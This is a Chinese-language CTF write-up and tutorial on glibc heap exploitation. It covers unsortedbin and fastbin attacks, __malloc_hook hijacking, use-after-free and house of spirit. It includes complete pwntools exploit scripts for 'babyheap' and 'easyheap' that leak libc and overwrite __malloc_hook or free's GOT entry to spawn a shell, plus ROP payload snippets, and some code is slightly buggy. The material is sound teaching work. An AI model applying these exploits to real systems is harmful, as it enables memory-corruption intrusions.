[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194317-8b323b32-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194317-8b323b32-5109-1.png)

此时 target 的 fd 内容就是 unsortedbin 头的 fd 指针（glibc 中 fd 指针肯定是 0x7f 开头的大数值）。因此就实现 target 地址的指定位置处写入了一个大的数值。

**在 fastbin attack 中的运用：**

当 fastbin attack 中构造堆块的时候，需要将目标地址的 size 数值处写入一个 0x7f 才能通过检测 1 的检查，如果没有办法写入 0x7f 的话，就需要用到 unsortedbin attack，将构造堆块的地址作为 unsortedbin attack 的目标地址，通过改写 unsortedbin 头的 fd 指针为目标地址，就可以在指定位置写入 0x7f 的数值了（**要计算好偏移位置**)

**操作：**

1.malloc fastchunk 0x70

2.free fastchunk

3.fastchunk.fd - > target_addr

4.malloc unsortedchunk 0x100

5.free unsortedchunk

6. 改变 0x100+0x8 的位置为 target_addr （就是 bk 的位置)

7.malloc 0x100 此时已经把 bin 头的地址跟 target.fd 连接起来了

8.malloc 0x70 将第一次 malloc 的堆块取出来，此时 fastbin 中只有 target 了

9.malloc 0x70 取出 target

(其中 1 2 3 8 9 是 fastbin attack 4 5 6 7 是 unsortedbin attack)

```
其中第8步来看一下。
我们在第3步的时候，是通过指针来使得fastchunk.fd->target_addr的。
但是实际上，target_addr是没有落在fastbin上面的。只能算是被连接到fastbin上面了
所以在malloc 0x70的时候取出fastchunk，但是fastbin中仍然存在着target
我们申请unsortedbinchunk并且修改bk指针为target_addr，的目的只是为了让bin头指向target.fd
```

**例子**

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main()
{
    int size=0x100;
    char *p=malloc(size);
    printf("%p\n",p);
    free(p);
    puts("1"); //第一步

    *(long*)(p+8)=0x601100; //0x601100是我们的攻击目标
    puts("2"); //第二步

    char *r=malloc(size);
    printf("%p\n",r);
    puts("3"); //第三步

    return 0;
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194330-932b7376-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194330-932b7376-5109-1.png)

由于申请了 0x100 的堆块，所以它被释放之后会被放入 unsortedbin 中

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194341-99597932-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194341-99597932-5109-1.png)

可以看到 freechunk 的 bk 和 fd 都指向于 malloc_state 结构体中的 bin 链头 fd 处。

然后在让 bk 指向 target

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194349-9e78c990-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194349-9e78c990-5109-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194538-df26a67e-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194538-df26a67e-5109-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194530-da5ab0fe-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194530-da5ab0fe-5109-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194519-d41531ec-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194519-d41531ec-5109-1.png)

最后一步的这个 0x3，就是偏移了，因为我们只想取得 0x7f，而 0x601110 的高位才是 0x7f。

然后可以看到第三位才是 7f，所以偏移是 0x3.

### _malloc_hook 攻击

**原理：****malloc_hook 攻击原理为 fastbin attack，通过 fastbin attack，我们可以发起** malloc_hook 攻击，将__malloc_hook 作为我们的 target。

malloc 源代码

```
void * __libc_malloc (size_t bytes){

    mstate ar_ptr;
    void *victim;
    //读取_malloc_hook钩子，如果有钩子，则运行钩子函数并返回
    void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook);
    if (__builtin_expect (hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS (0));

    arena_get (ar_ptr, bytes); //寻找一共合适的arena来加载内存

    victim = _int_malloc (ar_ptr, bytes);//尝试调用_int_malloc()来分配内存
    如果没有找到合适的内存，就尝试找一个可用的arena
    if (!victim && ar_ptr != NULL){
        LIBC_PROBE (memory_malloc_retry, 1, bytes);
        ar_ptr = arena_get_retry (ar_ptr, bytes);
        victim = _int_malloc (ar_ptr, bytes);
    }

    if (ar_ptr != NULL) //如果锁定了arena，还需要解锁该arena
        (void) mutex_unlock (&ar_ptr->mutex);

    return victim;
}
```

方向①：我们可以将 **malloc_hook 函数指针改为 got 表中的其它函数指针，那么当执行 malloc 的时候就回去直接执行我们修改的函数。  
方向②：如果我们将** malloc_hook 函数指针修改为 one_gadget 的地址，那么我们就可以在执行 malloc 的时候起一个 shell。

**方法：** 进程的_malloc_hook 地址一定为 0x7ffff7dd1b10，所以我们将 0x7ffff7dd1b10 作为我们的 target 目标。 但是由于 0x7ffff7dd1b10 地址的指定偏移处的 size 成员数值不能够满足 glibc 的检测，因此我们需要在 malloc_hook 地址附近找一块合适的地址作为我们的攻击目标。下图可以看出 0x7ffff7dd1b10 地址的数值都为 0 不符合要求。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194556-ea09b46e-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194556-ea09b46e-5109-1.png)

通过尝试发现，0x7ffff7dd1b10-0x23 地址处的指定 8 字节偏移处的数值能够满足 glibc 的检测，所以我们最终把 0x7ffff7dd1b10-0x23=0x7ffff7dd1aed 地址作为我们的攻击目标。从下图可以看出，0x7ffff7dd1b10-0x23 地址的数值为 0x7f，满足 size 成员的要求。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194606-eff037ea-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194606-eff037ea-5109-1.png)

babyheap-new
------------

### 漏洞利用

程序主要在 fill 函数的地方存在堆溢出，且开启的 PIE，需要泄露 libc_base 的地址。开启了 Full RELRO 就说明不能使用修改 got 表劫持程序的控制流。 所以就考虑劫持 malloc_hook 函数并且修改 malloc_hook 为 onegadget 获取 shell。

泄露 libc_base 使用的是堆块堆叠，将一共 fast chunk 和 unsorted chunk 重叠，然后释放 unsorted chunk，就可以通过打印 fast chunk 获取想要的地址。

先上脚本，然后跟着脚本 (看的自己有修改) 进行调试。

```
from pwn import *


p=process("./babyheap")
#p=remote("node4.buuoj.cn",26283)

def allocate(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def fill(idx,content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size: ')
    p.sendline(str(len(content)))
    p.recvuntil('Content: ')
    p.send(content)

def free(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

def dump(idx):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()

allocate(0x10)      #chunk0
allocate(0x10)      #chunk1
allocate(0x10)      #chunk2
allocate(0x10)      #chunk3
allocate(0x80)      #chunk4

free(1)
free(2)
#gdb.attach(p)


payload = "a"*0x10
payload += p64(0) + p64(0x21)
payload += p64(0) + "a"*8
payload += p64(0) + p64(0x21)
payload += p8(0x80)     #chunk2->fd = chunk4
fill(0,payload)

#gdb.attach(p)

payload = "A"*0x10
payload += p64(0) + p64(0x21) #chunk4->size
fill(3,payload)

#gdb.attach(p)

allocate(0x10)      #chunk1
allocate(0x10)      #chunk2, 重叠chunk4

//fill(1,'aaaa')
//fill(2,'bbbb')
payload = "A"*0x10
payload += p64(0) + p64(0x91)  #chunk4->size
fill(3,payload)

allocate(0x80)      #chunk5
free(4)

leak_addr = u64(dump(2)[:8])
libc_base = leak_addr - 0x3c4b78
malloc_hook = libc_base + libc.symbols['_malloc_hook']


allocate(0x60)      #chunk4
free(4)

#payload = p64(malloc_hook - 0x20+0xd)
payload = p64(libc_base+0x3c4aed)
fill(2, payload)

allocate(0x60)      #chunk4
allocate(0x60)      #chunk6(fake chunk)

one_gadget = libc + 0x4526a
payload = p8(0)*3 +p64(0)*2+ p64(one_gadget)
fill(6, payload)

#gdb.attach(p)

allocate(0x10)

p.interactive()
```

初始内存分布

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194706-13b74880-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194706-13b74880-510a-1.png)

可以看到，heap 从 0x555b0e321000 开始

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194713-18351b94-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194713-18351b94-510a-1.png)

然后我们释放 chunk1 和 chunk2 `free(1);free(2)`此时在单链表 fastbin 中 chunk2->fd 指向 chunk1.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194721-1cd73416-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194721-1cd73416-510a-1.png)

如果利用栈溢出的漏洞，修改堆内存，把 chunk2->fd，使它指向 chunk4，就可以将 unsortedbin chunk，链接到 fastbin 中。

但是此时害需要把 chunk4->size 的 0x91 修改成 0x21, 绕过检测 1 即 malloc 对 fastbin chunk 大小的检查。

由于程序开启了 PIE，所以实际上我们是不知道 heap 的地址的，因为它是随机的，但是 heap 的起始地址的低字节一定是 0x00，那么 chunk4 的低字节位一定是 0x80(因为每个 chunk 相隔 0x20) 这种情况是在申请前面的 init 函数中的那个 table 空间申请使用 mmap 系统调用，而不是通过 malloc 函数调用，是为了保证 chunk 是从 heap 的起始地址开始分配的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194729-218f52c2-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194729-218f52c2-510a-1.png)

此时开启这个断点。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194737-261fb91c-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194737-261fb91c-510a-1.png)

将 0x80 写入 chunk2 的 fd 指针了，即 chunk2->fd -> chunk4

此时再次申请空间，根据 fastbin 后进先出的原理，那么实际上调用的是 chunk2，在 chunk2 的位置创建一共 new chunk1，在 chunk4 的位置创造一个重叠的 new chunk2.

先来查看一下，chunk4 修改 size，使其通过 malloc 的 fastbin 大小检查

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194745-2b3b5546-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194745-2b3b5546-510a-1.png)

可以看到在 0x80 的 size 位变成了 0x21

```
这边的chunk的结构是一共占0x20个位置，第一个0x8，放置1或者0，查看chunk是否可以使用，第二个0x8存放size
最后的0x10存放content，但是这个content可以溢出嘛，然后写到下面一位的第一个0x8第二个0x8这样
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194754-301b8b1c-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194754-301b8b1c-510a-1.png)

在断到重新申请 chunk

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194804-3659479e-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194804-3659479e-510a-1.png)

由于 unsortedbin 双链表，会产生 chunk4 和 top chunk 合并，所以申请完 chunk4 之后要将 chunk4->size 修改 0x91，并且申请一个 unsortedbin chunk，这样释放的 chunk4 就可以将它放入 unsortedbin。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194813-3b763192-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194813-3b763192-510a-1.png)

chunk5 为防止合并的 chunk

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194827-43f06f4a-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194827-43f06f4a-510a-1.png)

此时 chunk4 的 fd，bk 指针均指向 main_arena+88，又因为这个是起始地址，所以只要找 libc 的起始地址然后做差就行（main_arena 和 libc 有一个固定偏移 0x3c4b20）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194835-49089944-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194835-49089944-510a-1.png)

hex(3951480) = 0x3c4b78

libc_base = fd_addr - 0x58 - 0x3c4b20

接下来就是修改_malloc_hook 了，malloc_hook 指向 void _function(size_t size, void_ caller), 调用 malloc 函数的时候，首先会判断 hook 函数指针是否为空，不为空才调用它。所以需要使得 malloc_hook 指向 one_gadget。但是由于 fast chunk 的大小只能在 0x20 到 0x80 之间, 那么就要计算偏移了，因为要找到 0x7f

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194844-4e46a540-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194844-4e46a540-510a-1.png)

此时 malloc_hook 滞空，但是上面却有 0x7f，那么它们相差多少距离

相差一个 0x10 再 - 2 个字节，0xd

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194854-53dc8fce-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194854-53dc8fce-510a-1.png)

此时所拥有 0xd 这个位置的 chunk 就称 fake chunk，因为它不会在 heap 中出现。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194902-5924eecc-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194902-5924eecc-510a-1.png)

断到发送 payload 后面

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194927-678f1578-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194927-678f1578-510a-1.png)

然后我们把它申请回来，但是此时只把 fastbin 链表后面那个申请回来了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194934-6be0da58-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194934-6be0da58-510a-1.png)

要想把这个 0x7f 申请回来，则需要再申请一个 0x60 的大小

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194941-701a8bfa-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194941-701a8bfa-510a-1.png)

这个时候就把 0x7f 给申请回来了。那下一步就是修改这个目标地址的数据为 one_gadget

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194950-75597ea0-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194950-75597ea0-510a-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194957-79b6bddc-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194957-79b6bddc-510a-1.png)

这样就成功的往 malloc_hook 中写入 one_gadget 了。

那么 p8(0)_3 + p64(0)_ 2 这个是怎么计算出来的呢

我们回过头看一下 main_arena-0x30 这个位置。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129195006-7ef59d72-510a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129195006-7ef59d72-510a-1.png)

由于需要 0x7f 才能通过 fastbin 的 malloc 检查，所以我们在 malloc 那个 fake chunk 的时候需要那个 size 位上面是 0x7f。这才导致我们用上了 + 0xd 这个位置，但是我们的目标地址是 malloc_hook，实际上是要更改 malloc_hook 的参数，所以在最后写入 one_gadget 的时候要计算一下位置，p8(0)*3 的意思是 0x7f 距离刚开始有 6 个位置 (0x00007f)，然后从上面的 2 个 0x8 0x8(2 个地址) 开始填充，所以需要这么大的空间，才能刚刚好把 one_gadget 写在 0x00007f。。。。。

再最后调用 calloc 函数就能调用 malloc_hook。

##### 8.3.2 Use After Free

**原理**

简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

*   内存块被释放后，其对应的指针被设置为 NULL ，然后再次使用，自然程序会崩溃。
*   内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
*   内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。**

**UAF 漏洞利用过程：**

1.  申请一段空间，并将其释放，释放后的指针不清空，将这个指针简称为 p1
2.  申请空间 p2， 由于 malloc 分配过程原则，使得 p2 指向刚刚释放的 p1 的空间，构造特殊的数据将这段内存空间覆盖
3.  利用 p1，一般会多出一个函数的指针，由于之前已经使用 p2 将 p1 的数据给覆盖了，所以此时 p1 上的数据是我们可以控制的，就存在劫持函数流的可能

###### **例题 1. 不重置指针**

```
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name)); 
  a->func = myprint; //指向myprint函数
  a->myname = "I can also use it"; 
  a->func("this is my function"); //打印出this is my function
  // free without modify
  free(a); //释放a的空间，但是不重置指针为NULL
  a->func("I can also use it"); //仍然会打印出I can also use it
  // free with modify
  a->func = printmyname;  //给指针赋值上新函数
  a->func("this is my function"); //此时就不会打印出this is my function而是 call print my name
  // set NULL
  a = NULL; //设置指针为空 
  printf("this pogram will crash...\n");
  a->func("can not be printed..."); //无效，没有反应
}
```

最后输出的结果

```
this is my function
I can also use it
call print my name
this pogram will crash...
```

###### 2. 例题 double free

目录

```
1.程序分析
    main.c
    crate函数
    delete函数
2.漏洞分析
    UAF漏洞
3.思路
    利用UAF漏洞将结构体函数修改成put函数
    通过获取程序基地址绕过PIE
    通过修改printf函数泄露libc_base,或者通过计算偏移得出libc_base
    再次利用UAF漏洞将结构体函数修改成system函数，并在寄存器上布置/bin/sh
4.总结与理解
```

**程序分析**

从源代码部分进行分析，再从反编译层面理解

main.c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct String{
    union {
        char *buf;
        char array[16];
    } o;
    int len;
    void (*free)(struct String *ptr);
} String;

struct {
    int inuse;
    String *str;
} Strings[0x10];

void showMenu(void);

int getInt(void);

void creatStr();

void deleteStr();

void freeShort(String *str);

void freeLong(String *str);
int getInt(void) {
    char str[11];
    char ch;
    int i;
    for (i = 0; (read(STDIN_FILENO, &ch, 1), ch) != '\n' && i < 10 && ch != -1; i++) {
        str[i] = ch;
    }
    str[i] = 0;
    return atoi(str);
}

int main(void) {
    char buf[1024];
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    printf("+++++++++++++++++++++++++++\n");
    printf("So, let's crash the world\n");
    printf("+++++++++++++++++++++++++++\n");


    while (1) {
        showMenu();
        if(read(STDIN_FILENO,buf,1024)==0){
            return 1;
        }
        if(!strncmp(buf,"create ",7)) {
            creatStr();
        } 
        else if (!strncmp(buf,"delete ",7)) {
            deleteStr();
        }
        else if(!strncmp(buf,"quit ",5)) {
            printf("Bye~\n");
            return 0;
        }
        else{
            printf("Invalid cmd\n");
        }
    }

}
void freeShort(String *str) {
    free(str);
}

void freeLong(String *str) {
    free(str->o.buf);
    free(str);
}

void deleteStr() {
    int id;
    char buf[0x100];
    printf("Pls give me the string id you want to delete\nid:");
    id = getInt();
    if (id < 0 || id > 0x10) {
        printf("Invalid id\n");
    }
    if (Strings[id].str) {
        printf("Are you sure?:");
        read(STDIN_FILENO,buf,0x100);
        if(strncmp(buf,"yes",3)) {
            return;
        }
        Strings[id].str->free(Strings[id].str);
        Strings[id].inuse = 0;
    }
}


void creatStr() {
    String *string = malloc(sizeof(String));
    int i;
    char *str = NULL;
    char buf[0x1000];
    size_t size;

    printf("Pls give string size:");
    size = (size_t) getInt();
    if (size < 0 || size > 0x1000) {
        printf("Invalid size\n");
        free(string);
        return;
    }
    printf("str:");
    if (read(STDIN_FILENO, buf, size) == -1) {
        printf("got elf!!\n");
        exit(1);
    }
    size = strlen(buf);
    if (size < 16) {
        strncpy(string->o.array, buf, size);
        string->free = freeShort;
    }
    else {
        str = malloc(size);
        if (str == NULL) {
            printf("malloc faild!\n");
            exit(1);
        }
        strncpy(str, buf, size);
        string->o.buf = str;
        string->free = freeLong;

    }

    string->len = (int) size;
    for (i = 0; i < 0x10; i++) {
        if (Strings[i].inuse == 0) {
            Strings[i].inuse = 1;
            Strings[i].str = string;
            printf("The string id is %d\n", i);
            break;
        }
    }
    if (i == 0x10) {
        printf("The string list is full\n");
        string->free(string);
    }
}


void showMenu(void) {
    printf("1.create string\n");
    printf("2.delete string\n");
    printf("3.quit\n");
}
```

首先映入眼帘的就是 2 个结构体

```
typedef struct String
{
    union {
        char *buf;
        char array[16];
    } o;
    int len;
    void (*free)(struct String *ptr);
} String;

struct
{
    int inuse;
    String *str;
} Strings[0x10];
```

create 函数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191413-7c0dbf5e-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191413-7c0dbf5e-5105-1.png)

此时就可以考虑 UAF，先通过 2 次 create，然后修改 Str 结构体函数指针指向一个地址 (考虑 PIE 绕过)。

delete 函数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191424-8269b542-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191424-8269b542-5105-1.png)

这边就调用了结构体函数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191433-87bcf4c8-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191433-87bcf4c8-5105-1.png)

在查看 ida 分析的时候，delete 函数的调用就显得比较难理解了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191443-8d6319e8-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191443-8d6319e8-5105-1.png)

但是回头来看 create 函数的这边给全局变量 string 赋值的

或者也可以在 ida 里面添加结构体来使得更好看，但是这个结构体要自己写，也要看的懂结构体才行。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191453-93c63c5c-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191453-93c63c5c-5105-1.png)

漏洞分析 **

首先是结构体

```
typedef struct String
{
    union {
        char *buf;
        char array[16];
    } o;
    int len;
    void (*free)(struct String *ptr);
} String;
```

这个有调用一个函数，这样就很有意思了，就可以把这个函数修改成自己想要的函数。

然后是 delete 虽然调用了 free 函数，但是却没有将函数指针设 NULL。这边就出现了 UAF 漏洞。

**解题思路**  
利用 UAF 漏洞将结构体函数修改成 put 函数  
通过获取程序基地址绕过 PIE  
通过修改 printf 函数泄露 libc_base, 或者通过计算偏移得出 libc_base  
再次利用 UAF 漏洞将结构体函数修改成 system 函数，并在寄存器上布置 / bin/sh

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191534-abe54080-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191534-abe54080-5105-1.png)

free_one 的函数地址，我们向上找出一个 D 开头的可调用的函数地址

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191543-b16baf30-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191543-b16baf30-5105-1.png)

D2D 这边有个 call _puts 函数地址，我们可以通过 UAF 漏洞来修改 puts 函数的地址

```
create(15,"giao1")
create(15,"giao2") 这边只要小于16就行，会申请一个大小为32的空间
delete(1)
delete(0)  此时fast bin 的链表结构为 string1 -> string0
```

然后需要创建一个大于 16 且能放下 payload 大小的堆块。

```
create(32,'a'*24+'\x2d')
delete(1)   调用函数，被修改成puts函数
```

接收数据，计算 elf_base 和 printf 函数的真实地址, 还有一些寄存器的真实地址

```
elf_base = u64(p.recv(6).ljust(8,'\x00'))  -0xd2d
printf_plt = elf_base + 0x9d0
puts_plt = elf_base + 0x990
puts_got = elf_base + 0x202030  got地址可以用elf.got['puts']获取
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191558-ba9994b4-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191558-ba9994b4-5105-1.png)

```
pop_rdi = elf_base + 0x11e3
pop_12_15 = elf_base + 0x11dc
```

然后要删除刚刚创建的那个 string，再次调用 UAF 实现 libc_base 的泄露。

格式化字符串漏洞泄露：（学艺不精，如果是自己想的话，不太能够想到）

```
delete(0)
create(32,'a'*8 + '%30$p' + 's'*11 + p64(printf_addr))
delete(1)
x = p.recv()
libc_base = int(x[8:22],16) - 0x3b5760

然后再次使用UAF就行了
delete(0)
create(32, '/bin/sh;' + 's'*16 + p64(system_addr))
delete(1)
```

（不太行）

通过泄露 puts_got 计算 libc_base

```
delete(0)
payload = 'a'*24+p64(pop_12_15)+'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt) + p64(0xc71+elf_base)  

其实有点不太能理解这个pop_12_15为什么在这边使用，可以存放后面的参数吧可能，
然后就是这次的pop_rdi放入参数泄露，最后再回到菜单函数(0xc71)
create(32,payload)
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh').next()
delete(1)
delete(0)
payload = 'a'*24+p64(pop_12_15) +'a'*8 + p64(pop_rdi) + p64(binsh_addr)+ p64(system_addr)
delete(1)
再次调用UAF，修改成system，getshell
```

**总结与理解**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191626-cad9aecc-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191626-cad9aecc-5105-1.png)

这道题的难度确实在，多次调用 UAF 漏洞来依次进行 elf_base ,libc_base ,getshell 的操作，要做到熟悉的使用 UAF 漏洞还需要进一步的刷题与学习

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191710-e4fde25a-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191710-e4fde25a-5105-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191700-df4bdeb6-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191700-df4bdeb6-5105-1.png)

程序分析
----

### create a heap

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191732-f21d9552-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191732-f21d9552-5105-1.png)

### edit a heap

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191741-f77d90e2-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191741-f77d90e2-5105-1.png)

### delete a heap

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191750-fd34549e-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191750-fd34549e-5105-1.png)

思路
--

创建 3 个 chunk，chunk 0 1 2 ，把 chunk1 的内容写 / bin/sh

利用 house of spirit， 制造一个 fake chunk 到 heaparray 附近，伪造 fake chunk 就需要绕过 malloc fastbin 的检查。所以仍然需要使用 0x7f 来构造 0x70 的 fastbin

然后通过伪造的 fastbin 输入内容覆盖 chunk0 的地址为 free_got 的地址

然后编辑 chunk0 将 free_got 修改成 system_plt

这样把 chunk1 free 掉的时候就会调用 system("/bin/sh")

脚本调试
----

```
from pwn import *

p = process('./easyheap')
#p = remote('node4.buuoj.cn',25139)
elf =ELF('./easyheap')



def create(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.send(str(size))
    p.recvuntil('Content of heap:')
    p.send(str(content))    

def edit(index,size,content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Size of Heap : ')
    p.send(str(size))
    p.recvuntil('Content of heap : ')
    p.send(str(content))

def delete(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

free_got = elf.got['free']

create(0x68,'aaaa')
create(0x68,'bbbb')
create(0x68,'cccc')
delete(2)

#gdb.attach(p)

payload = '/bin/sh\x00' + 'a' * 0x60 + p64(0x71) + p64(0x6020b0-3)
edit(1,len(payload),payload)

create(0x68,'aaaa')
create(0x68,'c')

payload = p8(0)* 35 + p64(free_got)
edit(3,len(payload),payload)
payload = p64(elf.plt['system'])

#gdb.attach(p)

edit(0,len(payload),payload)
delete(1)

#gdb.attach(p)

p.interactive()
```

在第一个 payload 发送之前断点

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191805-064afee8-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191805-064afee8-5106-1.png)

chunk2 进入 fastbin fd 指针指向 0x00 .

```
payload = '/bin/sh\x00' + 'a' * 0x60 + p64(0x71) + p64(0x6020b0-3)
edit(1,len(payload),payload)
```

然后修改 chunk1 的内容为 "/bin/sh\x00"+0x60

后面的部分就是溢出了，溢出的地方就覆盖到了 chunk2

来看一下 heap 结构

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191821-0f8b9c92-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191821-0f8b9c92-5106-1.png)

p64（0x71) 其实是保持这个 chunk 的 size 不变，后面的这个 0x6020ad 才是我们更改的 fd 指针。看一下这个位置是什么

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191829-14a67864-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191829-14a67864-5106-1.png)

0x7f

我们的目标地址是 bss 段上面的那个 magic

查看 magic 附近

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191840-1b1e5888-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191840-1b1e5888-5106-1.png)

0x6020b0 的第三位有 0x7f，那就拿来用了，可能有点不好看出来，在 0x6020b0 附近随便减一些，然后看一下内存就行了

既然 fake chunk 已经伪造成功了，那如果这个时候再把原本的 chunk2 申请回来会是什么样子的

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191850-20ca3c52-5106-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191850-20ca3c52-5106-1.png)

这个是申请 chunk2 的

